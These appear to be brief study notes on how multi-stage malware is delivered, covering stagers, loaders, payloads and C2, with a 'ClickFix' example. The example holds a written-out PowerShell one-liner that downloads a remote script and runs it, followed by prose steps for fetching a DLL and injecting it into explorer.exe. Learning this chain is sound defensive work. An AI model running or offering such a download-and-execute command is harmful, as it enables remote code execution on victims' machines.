BIG PICTURE:
User runs command
     ↓
Stager (Stage 0)  ==> Very small script whos job is to download next stage.
     ↓
Loader (Stage 1)  ==> A Pgm/script that loads the real malware into memory/downloads additional component
     ↓
Stage 2 Payload  ==> Intermediate payload that setup environment before final malware
     ↓
Final Payload    ==>The Actual Malicious tool attacker wants to un
     ↓
C2 / Persistence

Loader vs stager:
Type	                  Size                    	Role
Stager	                very small	              download next stage
Loader	                larger	                  prepare & run payload

Memory trick:

Stager = fetch
Loader = launch

Real ClickFix Multi-stage Example:
Stage 0 - Stager (User runs)
powershell -c "iwr http://site/1.ps1 | iex"
Stage 1 - Loader
1.ps1 downloads loader.exe
Stage 2 - Setup
loader.exe downloads payload.dll
Final Payload
payload.dll injected into explorer.exe

